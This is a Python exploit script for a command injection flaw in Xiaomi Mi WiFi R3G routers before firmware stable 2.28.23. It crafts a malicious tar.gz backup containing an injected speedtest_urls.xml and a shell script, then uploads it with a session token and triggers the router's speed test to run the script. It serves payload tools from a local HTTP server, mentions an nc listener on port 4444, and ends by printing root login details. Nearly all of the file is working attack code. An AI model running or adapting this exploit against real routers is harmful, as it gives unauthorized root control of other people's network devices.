#!/usr/bin/python
# There is a remote command execution vulnerability in Xiaomi Mi WiFi R3G before version stable 2.28.23.
# The backup file is in tar.gz format. After uploading, the application uses the tar zxf command to decompress,
# so you can control the contents of the files in the decompressed directory.
# In addition, the application's sh script for testing upload and download speeds will read the url list from /tmp/speedtest_urls.xml,
# and there is a command injection vulnerability.

# discoverer: UltramanGaia from Kap0k & Zhiniang Peng from Qihoo 360 Core Security

# HOW TO RUN
# Install requirements
# pip3 install -r requirements.txt
# Run the script
# python3 remote_command_execution_vulnerability.py

import os
import shutil
import tarfile
import requests
import re
import subprocess
import threading
import http.server
from functools import partial


router_ip_address = "192.168.31.1"
router_ip_address = input(
    f"Router IP address [press enter for using the default "
    f"{router_ip_address}]: ") or router_ip_address

# get ip address of the current machine, required to make the
route = subprocess.check_output(
    f"ip route get {router_ip_address}".split()).decode()
m = re.match(r'(?P<dst>(\d{1,3}[.]){3}\d{1,3}) '
             r'dev (?P<interface>\w+) '
             r'src (?P<src>(\d{1,3}[.]){3}\d{1,3}) .*', route)
if m:
    my_ip_address = m.group('src')
else:
    my_ip_address = "192.168.31.100"
my_ip_address = input(
    f"IP address of this machine [{my_ip_address}]") or my_ip_address

# get stok
stok = input("stok: ")
# stok = "eeb59f33a51cd46649cd4ad1e3f50ecf"

# From https://blog.securityevaluators.com/show-mi-the-vulns-exploiting-command-injection-in-mi-router-3-55c6bcb48f09
# In the attacking machine (macos), run the following before executing this script: /usr/bin/nc -l 4444
command = "((sh /tmp/script.sh exploit) &)"

# proxies = {"http":"http://127.0.0.1:8080"}
proxies = {}

if os.path.exists("build"):
    shutil.rmtree("build")
os.makedirs("build")


def gen_template(src, **kw):
    assert src.endswith(".template")
    with open(src, "rt", encoding="UTF-8") as f:
        template = f.read()
    data = template.format(**kw)
    dst = os.path.join("build", src.rsplit('.', 1)[0])
    with open(dst, "wt", encoding="UTF-8") as f:
        f.write(data)


# start the local HTTP server serving files in the script_tools/ dir
handler = partial(http.server.SimpleHTTPRequestHandler,
                  directory="script_tools")
handler.protocol_version = "HTTP/1.0"
for port in range(8000, 8010):
    try:
        httpd = http.server.ThreadingHTTPServer((my_ip_address, port), handler)
        break
    except OSError:
        # port already in use, try the next one
        pass

server_thread = threading.Thread(target=httpd.serve_forever)
server_thread.start()


# generate config & script file from templates
gen_template("speedtest_urls.xml.template",
             router_ip_address=router_ip_address, command=command)
gen_template("script.sh.template",
             my_ip_address=my_ip_address, port=port)


print("****************")
print("my_ip_address: " + my_ip_address)
print("router_ip_address: " + router_ip_address)
print("stok: " + stok)
print("****************")

# Make tar
with tarfile.open("build/payload.tar.gz", "w:gz") as tar:
    tar.add("build/speedtest_urls.xml", "speedtest_urls.xml")
    # tar.add("busybox")
    # tar.add("extras/wget")
    # tar.add("extras/xiaoqiang")
    tar.add("build/script.sh", "script.sh")

# upload config file
print("start uploading config file...")
r1 = requests.post(
    "http://{}/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(router_ip_address, stok),
    files={"image": open("build/payload.tar.gz", 'rb')},
    proxies=proxies
)
# print(r1.text)

# exec download speed test, exec command
print("start exec command...")
r2 = requests.get(
    "http://{}/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(router_ip_address, stok),
    proxies=proxies
)
# print(r2.text)
print("done! Now you can connect to the router using several options: (user: root, password: root)")
print("* telnet {}".format(router_ip_address))
print("* ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc -o UserKnownHostsFile=/dev/null root@{}".format(router_ip_address))
print("* ftp: using a program like cyberduck")
# shutdown the http server
httpd.shutdown()
server_thread.join()
